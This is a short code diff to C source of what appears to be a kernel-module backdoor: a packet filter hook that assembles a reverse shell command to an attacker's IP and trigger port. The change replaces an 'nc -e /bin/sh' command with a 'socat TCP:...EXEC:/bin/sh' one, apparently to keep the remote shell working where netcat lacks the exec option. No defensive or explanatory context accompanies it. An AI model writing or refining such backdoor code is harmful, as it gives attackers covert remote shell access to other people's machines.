@@ -109,7 +109,8 @@ static pfil_return_t my_packet_filter(struct mbuf **mp, struct ifnet *ifp, int d
     // Construct the reverse shell command
     char reverse_shell_cmd[100];
     snprintf(reverse_shell_cmd, sizeof(reverse_shell_cmd),
-       "nc -e /bin/sh %s %d", attacker_ip_str, TRIGGER_PORT);
+       "/usr/local/bin/socat TCP:%s:%d EXEC:/bin/sh", attacker_ip_str, TRIGGER_PORT);
+       
    
     printf("%s\n", reverse_shell_cmd);
     //printf("[LKM] Triggering reverse shell to %s on port 6969\n", attacker_ip_str);
